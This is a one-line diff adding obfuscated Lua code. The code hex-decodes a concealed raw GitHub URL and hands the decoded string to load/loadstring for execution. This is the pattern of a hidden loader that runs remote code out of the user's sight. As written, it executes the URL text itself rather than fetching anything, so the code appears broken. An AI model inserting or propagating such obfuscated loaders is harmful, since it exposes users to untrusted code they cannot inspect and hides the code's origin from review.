@@ -1,0 +1,1 @@
+local a function a(b)local c=tonumber local d=string.char local e function e(f)return d(c("0x"..f)%256)end return string.gsub(b,"..",e)end local g="68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F797A633630342F79797979797979792F726566732F68656164732F6D61696E2F797979797979792E747874"local h=load if not h then h=loadstring end h(a(g))(...)
